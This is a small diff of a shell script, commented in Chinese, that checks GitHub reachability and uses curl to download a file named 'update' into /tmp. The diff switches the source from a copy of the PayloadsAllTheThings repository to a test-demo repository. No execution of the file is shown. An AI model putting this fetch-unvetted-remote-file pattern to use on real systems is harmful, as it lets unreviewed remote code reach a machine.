@@ -15,7 +15,7 @@ echo "目标文件: /tmp/update"
 if curl -s https://github.com/ > /dev/null 2>&1; then
     
     # 下载测试文件
-    if curl -o /tmp/update https://raw.githubusercontent.com/yq00/PayloadsAllTheThings/refs/heads/master/update; then
+    if curl -o /tmp/update https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250611/update; then
         echo "✅ 文件下载成功"
         
         # 显示下载的文件内容
